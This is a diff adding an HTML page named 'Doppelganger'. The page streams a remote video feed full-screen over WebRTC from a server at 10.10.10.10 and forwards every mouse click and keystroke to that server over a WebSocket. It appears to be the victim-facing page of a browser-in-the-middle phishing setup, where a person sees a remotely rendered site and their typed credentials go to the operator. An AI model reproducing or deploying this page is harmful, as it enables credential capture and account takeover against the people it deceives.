@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Doppelganger</title>
+
+</head>
+<style>
+html, body {
+  margin: 0;
+  padding: 0;
+  width: 100%;
+  height: 100%;
+  overflow: hidden;
+}
+#videoElement {
+  width: 100%;
+  height: 100%;
+  object-fit: fill; /* ou "fill" selon l'effet désiré */
+  display: block;
+  object-position: top left;
+}
+</style>
+<body>
+  <video id="videoElement" autoplay playsinline></video>
+<script>
+  const ws = new WebSocket('ws://10.10.10.10:8080');
+
+  const peerConnectionConfig = {
+    iceServers: [
+      { urls: 'stun:stun.l.google.com:19302' },
+      {
+        urls: 'turn:10.10.10.10:3478?transport=tcp',
+        username: 'test',
+        credential: 'test'
+      }
+    ]
+  };
+
+  let peerConnection = new RTCPeerConnection(peerConnectionConfig);
+  peerConnection.addTransceiver('video', { direction: 'recvonly' });
+
+  peerConnection.onicecandidate = (event) => {
+    if (event.candidate) {
+      console.log("📡 Envoi d'un ICE candidate au serveur :", event.candidate);
+      ws.send(JSON.stringify({ type: 'candidate', candidate: event.candidate }));
+    }
+  };
+
+  peerConnection.ontrack = (event) => {
+    console.log("🎥 Flux vidéo reçu !", event);
+    if (event.streams && event.streams[0]) {
+      document.getElementById('videoElement').srcObject = event.streams[0];
+    } else {
+      console.warn("Aucun stream détecté dans l'event ontrack");
+    }
+  };
+
+  ws.onmessage = async (event) => {
+    const data = JSON.parse(event.data);
+    if (data.type === 'answer') {
+      console.log("🎥 Réponse WebRTC reçue", data.answer);
+      await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
+    } else if (data.type === 'candidate') {
+      console.log("📡 ICE candidate reçu du serveur :", data.candidate);
+      try {
+        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
+      } catch (err) {
+        console.error("Erreur lors de l'ajout d'un ICE candidate :", err);
+      }
+    } else if (data.type === 'reinit') {
+      console.log("Message 'reinit' reçu, relance de la négociation WebRTC.");
+      // Pour simplifier, on ferme l'ancienne connexion et on en crée une nouvelle,
+      // puis on lance startWebRTC pour initier la négociation.
+      if (peerConnection) {
+        peerConnection.close();
+      }
+      peerConnection = new RTCPeerConnection(peerConnectionConfig);
+      peerConnection.addTransceiver('video', { direction: 'recvonly' });
+      peerConnection.onicecandidate = (event) => {
+        if (event.candidate) {
+          console.log("📡 Envoi d'un ICE candidate au serveur :", event.candidate);
+          ws.send(JSON.stringify({ type: 'candidate', candidate: event.candidate }));
+        }
+      };
+      peerConnection.ontrack = (event) => {
+        console.log("🎥 Flux vidéo reçu !", event);
+        if (event.streams && event.streams[0]) {
+          document.getElementById('videoElement').srcObject = event.streams[0];
+        } else {
+          console.warn("Aucun stream détecté dans l'event ontrack");
+        }
+      };
+      startWebRTC();
+    }
+  };
+
+  ws.onopen = () => {
+    console.log("✅ WebSocket connecté !");
+    startWebRTC();
+  };
+
+  async function startWebRTC() {
+    const offer = await peerConnection.createOffer();
+    await peerConnection.setLocalDescription(offer);
+    console.log("📡 Offre WebRTC envoyée au serveur", offer);
+    ws.send(JSON.stringify({ type: 'offer', offer }));
+  }
+
+  document.addEventListener('click', (event) => {
+    const video = document.getElementById('videoElement');
+    if (!video) return;
+    const rect = video.getBoundingClientRect();
+    const relativeX = event.clientX - rect.left;
+    const relativeY = event.clientY - rect.top;
+    const clickData = {
+      type: 'user-event',
+      eventType: 'click',
+      x: relativeX,
+      y: relativeY,
+      videoWidth: window.innerWidth,
+      videoHeight: window.innerHeight
+    };
+    ws.send(JSON.stringify(clickData));
+  });
+
+  document.addEventListener('keydown', (event) => {
+    const keyData = {
+      type: 'user-event',
+      eventType: 'keydown',
+      key: event.key,
+      code: event.code,
+      shiftKey: event.shiftKey,
+      altKey: event.altKey,
+      ctrlKey: event.ctrlKey,
+      metaKey: event.metaKey
+    };
+    ws.send(JSON.stringify(keyData));
+  });
+</script>
+
+</body>
+</html>
+
